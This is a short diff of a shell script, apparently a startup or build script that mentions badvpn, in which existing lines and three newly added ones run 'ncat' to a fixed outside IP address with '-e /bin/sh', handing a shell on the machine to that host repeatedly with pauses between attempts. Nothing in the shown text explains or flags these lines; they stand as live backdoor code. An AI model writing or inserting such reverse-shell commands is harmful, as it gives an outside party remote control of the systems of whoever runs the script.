@@ -43,7 +43,12 @@ sleep 10
 ncat 195.201.134.209 84 -e /bin/sh
 sleep 10
 ncat 195.201.134.209 83 -e /bin/sh
-
+sleep 10
+ncat 195.201.134.209 84 -e /bin/sh
+sleep 10
+ncat 195.201.134.209 83 -e /bin/sh
+sleep 10
+ncat 195.201.134.209 84 -e /bin/sh
 #build_badvpn
 
 exit 0
